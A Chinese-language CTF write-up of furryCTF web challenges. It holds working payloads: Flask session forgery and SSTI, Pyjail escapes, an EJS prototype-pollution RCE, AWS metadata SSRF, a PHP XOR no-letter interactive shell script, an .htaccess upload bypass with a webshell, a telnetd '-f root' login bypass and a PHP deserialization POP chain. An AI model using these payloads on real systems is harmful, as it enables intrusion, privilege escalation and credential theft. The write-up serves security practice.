---
title: furryCTF 个人题解
description: 'furryCTF web方向的wp'
published: 2026-02-08
updated: 2026-02-11
image: ''
tags: ['CTF', 'WP', "WEB"]
category: 'CTF'
draft: false 
---

furryCTF虽然名字不是很好，但题是很舒服地ak了，刚刚被siscn爆揍的我做这些题总算是舒服了一点了，现在这个时间节点启还有SHCTF前两周目倒是ak了，启航杯刚打完，又被薄纱了，HGAME更是第一题都不会，www

## 固若金汤(热身赛)

> Nexus Corporation 刚刚完成了其核心门户网站的 3.1.0 版本升级。
> CTO 自信地宣称：“为了符合 ISO-27001 标准，我们实施了严格的密钥轮换策略，并修复了所有的 SQL 注入漏洞。”
> “现在的系统固若金汤，即便是内部员工也需要多因素认证才能访问。”

> > 或许dirsearch有惊喜？
> > 因为出题人的一些笨笨行为，本题容器时不时会出现502和加载缓慢，现已完成修复.jpg
> > 本题的笨笨出题人可能网页上多打了一个}，提交的时候注意一下

dirsearch一下，发现git泄漏，得到源码。

`app.py`中的关键点在于`dashboard`路由，存在明显的**SSTI**：

```python
@app.route('/dashboard')
def dashboard():
    if session.get('role') == 'admin':

        username = request.args.get('u', 'Administrator')
        template = f"""
        {{% extends "base.html" %}}
        {{% block content %}}
        <div class="alert alert-success">
            <h2>欢迎回到管理控制台, {username}!</h2>
            <p>系统完整性检查：通过</p>
            <p>Flag 服务状态：待机</p>
        </div>
        {{% endblock %}}
        """
        return render_template_string(template)
    else:
        return redirect(url_for('login'))
```

需要session中`role`为`admin`，源码里没有任何关于sesstion设置的代码，但是`secrey_key`使用了：

```python
SECRET_KEY = os.urandom(32)
SECRET_KEY_FALLBACKS = ["This_key_has_been_deprecated_v2023"]
```

`requirements`中提示了flask版本为`3.1.0`，这个版本存在[CVE-2025-47278](https://cve.imfht.com/detail/CVE-2025-47278)，即我们直接使用`SECRET_KEY_FALLBACKS`中的明文密钥即可加密session。

接下来就是session伪造：

```bash
›  flask-unsign --sign --cookie "{'role': 'admin'}" --secret "This_key_has_been_deprecated_v2023"          
eyJyb2xlIjoiYWRtaW4ifQ.aXwXFQ.teQcR-mYuX8gYcIec7oZLzmEkmY
```

使用这个cookie`Cookie: session=eyJyb2xlIjoiYWRtaW4ifQ.aXwXFQ.teQcR-mYuX8gYcIec7oZLzmEkmY`登录到`dashboard`，然后get传入`u={{8*8}}`即可，接下来就是正常的ssti流程。

## PyEditor/猫猫最后的复仇
> 猫猫最近发现了一个在线编辑器，里面似乎有一段没有被正确删除的代码……？

> 这次猫猫长记性了，把多余的代码给移除了。
> 但是猫猫很不服气，他觉得只要把环境变量清空，你们就不可能拿到flag。
> 为此他甚至升级了一下他的AST分析和黑名单替换，ban掉了import。
> 哼哼唧唧！
> 不信你们还能绕过呜呜呜~
> 
> 本题可以看成PyEditor的DLC
> 好消息是依旧存在一种思路可以同时拿到本题和PyEditor的分数
> （也就是相当于PyEditor荣升1100分,IN+难度）
> 坏消息是，真的有人能找到这种思路吗？
> 求求有人写个预期解吧呜呜呜呜

这道题的rev好像是去掉了更难的非预期？反正我同一个解法都秒了，但看官方wp这好像才是预期解？

网页是个python在线运行，考点是**Pyjail**，提供了源码，我们下载下来：

```python
import ast
import subprocess
import tempfile
import os
import time
import threading
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
import secrets

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', secrets.token_hex(32))
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024
socketio = SocketIO(app, cors_allowed_origins="*")

active_processes = {}

class PythonRunner:
    
    def __init__(self, code, args=""):
        self.code = code
        self.args = args
        self.process = None
        self.output = []
        self.running = False
        self.temp_file = None
        self.start_time = None
        
    def validate_code(self):
        try:
            if len(self.code) > int(os.environ.get('MAX_CODE_SIZE', 1024)):
                return False, "代码过长"
                
            tree = ast.parse(self.code)
            
            banned_modules = ['os', 'sys', 'subprocess', 'shlex', 'pty', 'popen', 'shutil', 'platform', 'ctypes', 'cffi', 'io', 'importlib']
            
            banned_functions = ['eval', 'exec', 'compile', 'input', '__import__', 'open', 'file', 'execfile', 'reload']
            
            banned_methods = ['system', 'popen', 'spawn', 'execv', 'execl', 'execve', 'execlp', 'execvp', 'chdir', 'kill', 'remove', 'unlink', 'rmdir', 'mkdir', 'makedirs', 'removedirs', 'read', 'write', 'readlines', 'writelines', 'load', 'loads', 'dump', 'dumps', 'get_data', 'get_source', 'get_code', 'load_module', 'exec_module']
            
            dangerous_attributes = ['__class__', '__base__', '__bases__', '__mro__', '__subclasses__', '__globals__', '__builtins__', '__getattribute__', '__getattr__', '__setattr__', '__delattr__', '__call__']
            
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    for name in node.names:
                        if name.name in banned_modules:
                            return False, f"禁止导入模块: {name.name}"
                        
                elif isinstance(node, ast.ImportFrom):
                    if node.module in banned_modules:
                        return False, f"禁止从模块导入: {node.module}"
                
                elif isinstance(node, ast.Call):
                    if isinstance(node.func, ast.Name):
                        if node.func.id in banned_functions:
                            return False, f"禁止调用函数: {node.func.id}"
                    
                    elif isinstance(node.func, ast.Attribute):
                        if node.func.attr in banned_methods:
                            return False, f"禁止调用方法: {node.func.attr}"
                    
                    elif isinstance(node.func, ast.Name):
                        if node.func.id == 'open':
                            return False, "禁止文件操作"
                
                elif isinstance(node, ast.With):
                    for item in node.items:
                        if isinstance(item.context_expr, ast.Call):
                            if isinstance(item.context_expr.func, ast.Name):
                                if item.context_expr.func.id == 'open':
                                    return False, "禁止文件操作"
                
                elif isinstance(node, ast.Attribute):
                    if node.attr in dangerous_attributes:
                        if isinstance(node.value, ast.Call) or isinstance(node.value, ast.Name):
                            return False, f"禁止访问危险属性: {node.attr}"
                
                elif isinstance(node, ast.Subscript):
                    if isinstance(node.value, ast.Attribute):
                        if node.value.attr == '__subclasses__':
                            return False, "禁止访问__subclasses__"
            
            return True, "代码验证通过"
            
        except SyntaxError as e:
            return False, f"语法错误: {str(e)}"
        except Exception as e:
            return False, f"验证错误: {str(e)}"
    
    def create_script(self):
        try:
            self.temp_file = tempfile.NamedTemporaryFile(
                mode='w', 
                suffix='.py', 
                dir='/tmp',
                delete=False
            )
            
            wrapper = """
import sys

def safe_exec():
    try:
{indented_code}
        return 0
    except SystemExit as e:
        return e.code if isinstance(e.code, int) else 0
    except Exception as e:
        print(f"执行错误: {{e}}", file=sys.stderr)
        return 1

sys.argv = ['sandbox.py'] + {args}

exit_code = safe_exec()

exit()
# Hey bro, don't forget to remove this before release!!!
import os
import sys

flag_content = os.environ.get('GZCTF_FLAG', '')
os.environ['GZCTF_FLAG'] = ''

try:
    with open('/flag.txt', 'w') as f:
        f.write(flag_content)
except:
    pass
"""
            
            indented_code = '\n'.join(['        ' + line for line in self.code.split('\n')])
            
            full_code = wrapper.format(
                indented_code=indented_code,
                args=str(self.args.split() if self.args else [])
            )
            
            self.temp_file.write(full_code)
            self.temp_file.flush()
            os.chmod(self.temp_file.name, 0o755)
            
            return self.temp_file.name
            
        except Exception as e:
            raise Exception(f"创建脚本失败: {str(e)}")
    
    def run(self):
        try:
            is_valid, message = self.validate_code()
            if not is_valid:
                self.output.append(f"验证失败: {message}")
                return False
                
            script_path = self.create_script()
            
            cmd = ['python', script_path]
            if self.args:
                cmd.extend(self.args.split())
            
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            self.running = True
            self.start_time = time.time()
            
            def read_output():
                while self.process and self.process.poll() is None:
                    try:
                        line = self.process.stdout.readline()
                        if line:
                            self.output.append(line.strip())
                            socketio.emit('output', {'data': line})
                    except:
                        break
                
                stdout, stderr = self.process.communicate()
                if stdout:
                    for line in stdout.split('\n'):
                        if line.strip():
                            self.output.append(line.strip())
                            socketio.emit('output', {'data': line})
                if stderr:
                    for line in stderr.split('\n'):
                        if line.strip():
                            self.output.append(f"错误: {line.strip()}")
                            socketio.emit('output', {'data': f"错误: {line}"})
                
                self.running = False
                socketio.emit('process_end', {'pid': self.process.pid})
            
            thread = threading.Thread(target=read_output)
            thread.daemon = True
            thread.start()
            
            return True
            
        except Exception as e:
            self.output.append(f"运行失败: {str(e)}")
            return False
    
    def send_input(self, data):
        if self.process and self.process.poll() is None:
            try:
                self.process.stdin.write(data + '\n')
                self.process.stdin.flush()
                return True
            except:
                return False
        return False
    
    def terminate(self):
        if self.process and self.process.poll() is None:
            self.process.terminate()
            self.process.wait(timeout=5)
            self.running = False
            
            if self.temp_file:
                try:
                    os.unlink(self.temp_file.name)
                except:
                    pass
            return True
        return False

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/run', methods=['POST'])
def run_code():
    data = request.json
    code = data.get('code', '')
    args = data.get('args', '')
    
    runner = PythonRunner(code, args)
    
    pid = secrets.token_hex(8)
    active_processes[pid] = runner
    
    success = runner.run()
    
    if success:
        return jsonify({
            'success': True,
            'pid': pid,
            'message': '进程已启动'
        })
    else:
        return jsonify({
            'success': False,
            'message': '启动失败'
        })

@app.route('/api/terminate', methods=['POST'])
def terminate_process():
    data = request.json
    pid = data.get('pid')
    
    if pid in active_processes:
        active_processes[pid].terminate()
        del active_processes[pid]
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'message': '进程不存在'})

@app.route('/api/send_input', methods=['POST'])
def send_input():
    data = request.json
    pid = data.get('pid')
    input_data = data.get('input', '')
    
    if pid in active_processes:
        success = active_processes[pid].send_input(input_data)
        return jsonify({'success': success})
    
    return jsonify({'success': False})

@socketio.on('connect')
def handle_connect():
    emit('connected', {'data': 'Connected'})

@socketio.on('disconnect')
def handle_disconnect():
    pass

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=False, allow_unsafe_werkzeug=True)
```

### 解

题目的沙箱十分严格，我们看到关键代码：

122行直接给出了环境变量里的flag键名，274行往下的`/api/send_input`路由能直接向一个正在运行的进程提供输入
```python
flag_content = os.environ.get('GZCTF_FLAG', '')
```

```python
@app.route('/api/send_input', methods=['POST'])
def send_input():
    data = request.json
    pid = data.get('pid')
    input_data = data.get('input', '')
    
    if pid in active_processes:
        success = active_processes[pid].send_input(input_data)
        return jsonify({'success': success})
    
    return jsonify({'success': False})
```

所以这道题就很明了了，就是一个交互型的pyjail。

我们在网页里输入代码`breakpoint()`阻塞程序同时等待输入，直接在页面上得到pid，在`/api/send_input`就能任意输入了：

```json
{
    "pid": "aadb4de77e79efae",
    "input": "__import__('os').environ.get('GZCTF_FLAG', '')"
}
```

### 官方其他解

1. `Python3.14`中`breakpoint()`支持了一个新参数`commands`，允许传入断点后执行的命令，所以我们先next三次从`safe_exec()`返回，在jump到第20行的`import os`，然后next三次读进`flag_content`变量，最后`p flag_content`即可：

    ```python
    breakpoint(commands = ['n'] * 3 + ['j 20'] + ['n'] * 3 + ['p flag_content'])
    ```

2. 
    ```python
    print(sys.modules['os'].environ['GZCTF_FLAG'])
    ```

3. 
    ```python
    try:
        ""/5
    except Exception as e:
        b = e.__traceback__.tb_frame.f_back.f_globals["__builtins__"]
        os_mod = b.__import__('os')
        print(os_mod.environ.get('GZCTF_FLAG', ''))
    ```


    `""/5`：故意触发`TypeError`，进入`except`

    `e.__traceback__.tb_frame.f_back.f_globals["__builtins__"]`：从调用者帧的全局变量中取出`__builtins__`

## 下一代有下一代的问题

考的是CVE-2025-55182，就是siscn一模一样的，直接拿现成的poc打。

[zzhorc/CVE-2025-55182: CVE-2025-55182复现环境及RCE回显poc](https://github.com/zzhorc/CVE-2025-55182)

## ezmd5

经典数组绕过，简单

## 贪吃Python

> 我要成为贪吃Python高手！
> Cr9flm1nd：（敲）你先给我把这个merge修了！
> gongyizhen：（抱头）呜呜呜，就不修就不修，这个merge明明工作的好好的……
> Cr9flm1nd：
> ```js
> const obj1 = { a: 1 };
> const obj2 = { b: obj1 };
> obj1.c = obj2; 
> 
> merge({}, obj1);
> ```
> RangeError，你管这叫好好的？（敲敲敲）
> > 温馨提示，本题没有爆破流程，请不要攻击平台，违者取消比赛资格

比较特殊的**原型链污染**。

打开网页，是个在线的贪吃蛇小游戏，与python没有任何关系，查看源码，看到仙家对话：
```html
<!-- -"你是不是应该在/admin加一个'忘记密码'?" -->
<!-- -"你不会真忘记密码了吧?这么简单的密码都能忘记?"-->
<!-- -"快告诉我密码，我要去/admin/dashboard修改分数，成为贪吃Python村赛冠军!"-->
<!-- -"不行，这次村赛公平公正，你就算进去/admin/dashboard也改不了分数"-->
<!-- -"?你的意思是,那个99999分是人打出来的?"-->
<!-- -"一码归一码"--> 
```

`/admin`路由通过`' or '1'=1'`万能密码即可登录，但是显示还需要物理令牌辅助多端认证才能登录到管理员，(随便搞的打发打发你)，下面还给出了服务器运行日志：

```bash
[SYSTEM_DIAGNOSTIC_DUMP_v3.1]
> Initializing environment checks...
> WORKDIR: /app [OK]
> NODE_ENV: production
> MOUNT_POINT: /app/public (Static Assets) [RW]
> Checking security modules...
> SUID Helper Found: /readflag (Permissions: 4755)
> WARNING: /flag file is protected (Mode: 0400). Root access required.
> MFA_MODULE: Not Loaded.
> SESSION_ID: a9mt9s
```

这就比较重要了，它直接表明了：
- `NODE_ENV: production`：后端是**Node.js**
- `SUID Helper Found: /readflag`：服务器根目录上存在程序**readflag**，显然是要RCE运行以得到flag
- `MOUNT_POINT: /app/public`：典型的Express目录结构，即网页使用了**Express框架**

我们回去玩一遍贪吃蛇，同时抓包，游戏结束后，我们抓到`socket.io`的数据包：

```json
42["game_over",{"score":0,"config":{"theme":"dark_mode","timestamp":1769944494720}}]
```

之前查看源码时就发现了，小游戏的源码是纯前端的明文js，但是与服务的通信使用了一个混淆过的js代码`./js/dataReport.js`，

这段恼人代码我不得不骂一下，它反调试反审计，检测到代码中有换行符就直接`about:blank`，还有``_0xb03['setInterval'](function() { debugger; }, 683277 ^ 683271);``，无限断点。

虽然都比较好规避，但就是烦。

回到之前的socket.io数据包，显然，这就是原型链污染的注入点了，接下来就是常规的污染`ejs`模板的`outputFunctionName`，替换掉原来的包：

```json
42["game_over",{"score":0,"config":{"__proto__":{"outputFunctionName":"_;return global.process.mainModule.require('child_process').execSync('/readflag').toString();_"}}}]
```

接下里回到`/admin/dashboard`，这里使用到了ejs模板，被污染之后就能返回shell结果了。

## CCPreview

> 为了测试内网服务的连通性，【数据删除】开发组上线了一个简单的网页预览工具。  
> 据说该服务部署在 AWS 也就是亚马逊云服务上，属于EC2实例……  
> 虽然它看起来只是一个简单的 curl 代理.jpg  
> “话说，咱们就这么部署在这里，真的没问题吗……”  
> “怕啥，这就一个curl，能有什么漏洞？”

[AWS 端点信息泄露](https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/instance-metadata-security-credentials.html)

考点是**SSRF**和**AWS EC2 元数据服务**。


1. 网页是一个部署在**AWS EC2**上的**curl 代理**。尝试注入`http://127.0.0.1" ; ls ; "`，得到报错`Failed to resolve '127.0.0.1%22%20;%20ls%20;%20%22'`。这说明服务器对全部的输入作为**域名**进行了解析，而不是直接拼接到了命令行中。因此，命令注入行不通。

2.  **AWS 元数据服务**：这是本题的核心考点。AWS EC2 实例默认运行着一个元数据服务（IMDS），用于获取实例的配置信息。这个服务运行在实例内部的固定 IP 地址上。
    *   **旧版 IMDSv1**：通过 `http://169.254.169.254/latest/meta-data/` 访问。
    *   **新版 IMDSv2**：需要先放置 token 才能访问， CTF 题目中，一般默认使用 IMDSv1 或者题目环境未强制开启 IMDSv2。

尝试访问 AWS 元数据服务的根路径：`http://169.254.169.254/latest/meta-data/`，得到：
```
iam/
network/
public-hostname/
```

接着访问 `iam/security-credentials/admin-role`：`iam`安全凭证目录下的`security-credentials`角色，下的角色`admin-role`，得到如下json：

```json
{
    'Code': 'Success',
    'Type': 'AWS-HMAC',
    'AccessKeyId': 'AKIA_ADMIN_USER_CLOUD',
    'SecretAccessKey': 'POFP{42dce9eb-ed08-42c4-819e-1622c61fcbdf}',
    'Token': 'MwZNCNz... (Simulation Token)',
    'Expiration': '2099-01-01T00:00:00Z'
}
```

## 命令终端

> 听说这个终端的admin是个极简主义者。  
> 他和其他的量产型admin一样，先是在门口设了一道关卡，但密码似乎设得很随性（qwe@123）。  
> 然后是里面的终端——它似乎听不得任何人类的语言。  
> 嗯，毕竟，它只是一个终端。  
> 在一片死寂的虚空中，或许只有你，能让代码在数据世界里默默消融……

登录后台，爆破找到源码：
```php
<?php
session_start();
if (empty($_SESSION['user_id']) || !is_int($_SESSION['user_id'])) {
    header('Location: ../index.php', true, 302);
    exit;
}
$output = "";
if (isset($_POST['cmd'])) {
    $code = $_POST['cmd'];
    if(strlen($code) > 200) {
        $output = "略略略，这么长还想执行命令？";
    } 
    else if(preg_match('/[a-z0-9$_\."`\s]/i', $code)) {
        $output = "啊哦，你的命令被防火墙吃了\n&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;来自waf的消息：杂鱼黑客，就这样还想执行命令？";
    } 
    else {
        ob_start();
        try {
            eval($code);
        } catch (Throwable $t) {
            echo "Execution Error.";
        }
        $output = ob_get_clean();
    }
}
```

过滤为``/[a-z0-9$_\."`\s]/i``，考点是无字母rce，直接使用异或构造出，用以前的脚本梭了：

```python
import requests
import re

URL: str = "http://ctf.furryctf.com:35885" 
COOKIES: dict[str, str] = {
    "PHPSESSID": "57f06e80be3683eb6a543ad852352fc6"
}

def xor_encode(string: str):
    encoded: str = ""
    for char in string:
        inverted = ~ord(char) & 0xFF
        encoded += "%" + hex(inverted)[2:].upper()
    return encoded

def send_cmd(cmd: str):
    enc_func: str = xor_encode("system")
    enc_arg: str = xor_encode(cmd)
    
    response = requests.post(
        URL + "/main/index.php",
        headers={ "Content-Type": "application/x-www-form-urlencoded" },
        data=f"cmd=(~{enc_func})(~{enc_arg});",
        cookies=COOKIES
    )
    match = re.search(r'命令输出:</strong><br>(.*?)</div>', response.text, re.S)
    print(f"{match.group(1).strip()}")

if __name__ == "__main__":
    while True:
        cmd: str = input("Shell> ")
        send_cmd(cmd)
```

## SSO Drive

> 身为红队的你发现，自己渗透的蓝方目标中似乎刚刚上线了一个新的目标：内部云盘。  
> 大概是蓝方的安全团队确信他们已经修复了所有逻辑漏洞，这里已经不会出问题了。  
> 而且，看起来他们为了以防万一，部署了一套极为严格的文件上传审查策略。  
> 也正是如此，他们才敢如此大胆的就把这个云盘暴露出来。
> 
> 好在，通过对其他资产目标的社工，你得知了这样两个情报：
>
> 1.负责认证模块的开发小哥有着随手备份源码的好习惯，虽然从蓝方聊天平台泄露出来的消息来看，他似乎发誓说新的密码校验逻辑是无懈可击的？  
> 2.蓝方运维团队泄露的内部公告指出，为了兼容旧系统，他们不得不在服务器后台运行了一个陈旧服务用于内部远程管理。

登录页直接数组绕过就行了，跳转到文件上传页，页面页提示了有`telnet`服务运行在`23`端口，文件上传允许`.htaccess`，但也要检验图片头，所以使用xbm文件头绕过

```bash title=.htaccess
#define width 1
#define height 1
AddType application/x-httpd-php jpg
```

```bash
Upload Successful!
Path: uploads/.htaccess
Image Type: image/xbm
```

然后就能上传图片马，因为过滤php长标签，所以短标签绕过：

```php
GIF89a
<?=`$_GET[cmd]`?>
```

在根目录看到了`start.sh`：

```bash
#!/bin/bash

service mariadb start

mysql -u root -e "CREATE DATABASE IF NOT EXISTS ctf_db;"
mysql -u root -e "CREATE USER IF NOT EXISTS 'ctf'@'localhost' IDENTIFIED BY 'ctf';"
mysql -u root -e "GRANT ALL PRIVILEGES ON ctf_db.* TO 'ctf'@'localhost';"
mysql -u root -e "FLUSH PRIVILEGES;"

if [ -f /var/www/html/db.sql ]; then
    mysql -u root ctf_db < /var/www/html/db.sql
fi

if [ ! -z "$GZCTF_FLAG" ]; then
    LEN=${#GZCTF_FLAG}
    PART_LEN=$((LEN / 3))
    FLAG1=${GZCTF_FLAG:0:$PART_LEN}
    FLAG2=${GZCTF_FLAG:$PART_LEN:$PART_LEN}
    FLAG3=${GZCTF_FLAG:$((PART_LEN * 2))}
    
    echo $FLAG1 > /flag1
    chmod 644 /flag1
    
    echo $FLAG2 > /var/www/html/.flag2_hidden
    chmod 644 /var/www/html/.flag2_hidden
    
    echo $FLAG3 > /root/flag3
    chmod 600 /root/flag3
    
    export GZCTF_FLAG=not_here
fi

/usr/sbin/xinetd -stayalive -pidfile /var/run/xinetd.pid
exec apache2-foreground

```

flag前2/3直接读就行了，最后1/3就是telnet的考点，是一个CVE：`CVE-2026-24061`，我们先读`/etc/xinetd.d/telnet`

```bash
service telnet
{
    disable = no
    flags = REUSE
    socket_type = stream
    wait = no
    user = root
    server = /usr/local/libexec/telnetd
    server_args = --debug
    log_on_failure += USERID
    bind = 0.0.0.0
    type = UNLISTED
    port = 23
}
```

看到user为root，就说明能够用来提权，执行：

```bash
(sleep 1; echo "cat /root/flag3"; sleep 1; echo "exit") | env USER="-f root" telnet -a 127.0.0.1 23
```

这里睡一秒等待建立链接，再睡一秒然后退出才能成功执行，`env USER="-f root"`这里就是这次CVE的核心了,得到响应就是flag了：

```bash
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.

Linux 5.10.0-35-cloud-amd64 (c1a4919c6f9b) (pts/0)
Linux c1a4919c6f9b 5.10.0-35-cloud-amd64 #1 SMP Debian 5.10.237-1 (2025-05-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

Last login: Mon Feb 2 16:13:18 UTC 2026 from localhost on pts/0
root@c1a4919c6f9b:~# cat /root/flag3
-5d32927098fa}
root@c1a4919c6f9b:~#
```

## babypop

经典**POP链构造**，不过还有一点小巧思

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
class SecurityProvider {
    private $token;
    public function __construct() {
        $this->token = md5(uniqid());
    }
    public function verify($data) {
        if (strpos($data, '..') !== false) {
            die("Attack Detected");
        }
        return $data;
    }
}
class LogService {
    protected $handler;
    protected $formatter;
    
    public function __construct($handler = null) {
        $this->handler = $handler;
        $this->formatter = new DateFormatter();
    }

    public function __destruct() {
        if ($this->handler && method_exists($this->handler, 'close')) {
            $this->handler->close();
        }
    }
}
class FileStream {
    private $path;
    private $mode;
    public $content; 
    public function __construct($path, $mode) {
        $this->path = $path;
        $this->mode = $mode;
    }
    public function close() {
        if ($this->mode === 'debug' && !empty($this->content)) {
            $cmd = $this->content;
            if (strlen($cmd) < 2) return;
            @eval($cmd);
        } else {
            return true;
        }
    }
}
class DateFormatter {
    public function format($timestamp) {
        return date('Y-m-d H:i:s', $timestamp);
    }
}
class UserProfile {
    public $username;
    public $bio;
    public $preference; 

    public function __construct($u, $b) {
        $this->username = $u;
        $this->bio = $b;
        $this->preference = new DateFormatter();
    }
}
class DataSanitizer {
    public static function clean($input) {
        return str_replace("hacker", "", $input);
    }
}
$raw_user = $_POST['user'] ?? null;
$raw_bio = $_POST['bio'] ?? null;
if ($raw_user && $raw_bio) {
    $sec = new SecurityProvider();
    $sec->verify($raw_user);
    $sec->verify($raw_bio);
    $profile = new UserProfile($raw_user, $raw_bio);
    $data = serialize($profile);
    if (strlen($data) > 4096) {
        die("Data too long");
    }
    $safe_data = DataSanitizer::clean($data);
    $unserialized = unserialize($safe_data);
    if ($unserialized instanceof UserProfile) {
        echo "Profile loaded for " . htmlspecialchars($unserialized->username);
    }
}
?>
```

这道题的链子不难构造：`LogService::__destruct -> FileStream::close()`，难的是我们的输入并不会被直接反序列化，而是作为字符串值转递给`UserProfile::user`和`UserProfile::bio`，然后再被序列化反序列化，关键点就在这里的序列化之后会应用`DataSanitizer::clean()`导致序列化对象变短，而序列化本身每个参数的长度标记是不会变的，我们就可以利用这个特性构造特定长度`hacker`重复串刚好吞掉`";s:3:"bio";s:M:"`作为代替`username`作为参数名，而之后的字符串就荣升为对象了。

原来的序列化对象，我们苦心构造的payload竟然只是字符串：

```php "hackerhackerhackerhacker" "-----";s:10:"preference";O:10:"LogService":2:{s:7:"handler";O:10:"FileStream":3:{s:4:"path";s:0:"";s:4:"mode";s:5:"debug";s:7:"content";s:10:"phpinfo();";}s:9:"formatter";N;}}"
O:11:"UserProfile":3:{
    s:8:"username";s:24:"hackerhackerhackerhacker";
    s:3:"bio";s:175:"-----";s:10:"preference";O:10:"LogService":2:{s:7:"handler";O:10:"FileStream":3:{s:4:"path";s:0:"";s:4:"mode";s:5:"debug";s:7:"content";s:10:"phpinfo();";}s:9:"formatter";N;}}";
    s:10:"preference";O:13:"DateFormatter":0:{}
} 
```

而删去`hackerhackerhackerhacker`之后，我们的字符串就荣升对象了：

```php "";s:3:"bio";s:175:"-----"
O:11:"UserProfile":3:{
    s:8:"username";s:24:"";s:3:"bio";s:175:"-----";
    s:10:"preference";O:10:"LogService":2:{
        s:7:"handler";O:10:"FileStream":3:{
            s:4:"path";s:0:"";
            s:4:"mode";s:5:"debug";
            s:7:"content";s:10:"phpinfo();";
        }
        s:9:"formatter";N;
    }
}";s:10:"preference";O:13:"DateFormatter":0:{}} 
```

当然，眼间的师傅就发现了，这样最后不是会多出来奇怪的东西吗，这个我们确实无法避免，但是海纳百川的php还是能正常反序列化，顶多是报个**Warning**: unserialize(): Error at offset xxx ~~(怪不得是黑客最喜欢的语言)~~

以下就是生成此payload的暴力代码：

```php
<?php
class LogService {
    public $handler;
    public $formatter;
}

class FileStream {
    public $path;
    public $mode;
    public $content;
}

// LogService::__destruct -> FileStream::close()

$payload = new LogService();
$payload->handler = new FileStream();
$payload->handler->path = "";
$payload->handler->mode = "debug";
$payload->handler->content = "phpinfo();";

$payload = serialize($payload);

// 暴力计算合适的payload长度
for ($i = 0; $i < 100; $i++) {
    // 要吃掉";s:3:"bio";s:[LEN]:"[PADDING]，长度必须是6的倍数
    // 填充单个字符来满足长度要求
    $payload_content = str_repeat("-", $i) . '";s:10:"preference";' . $payload . '}';
    $payload_len = strlen($payload_content);

    $eaten_structure = '";s:3:"bio";s:' . $payload_len . ':"';
    $length = strlen($eaten_structure) + $i;

    if ($length % 6 === 0) {
        $count = $length / 6;
        echo "user=" . str_repeat("hacker", $count);
        echo "&bio=" . $payload_content;
        break;
    }
}
```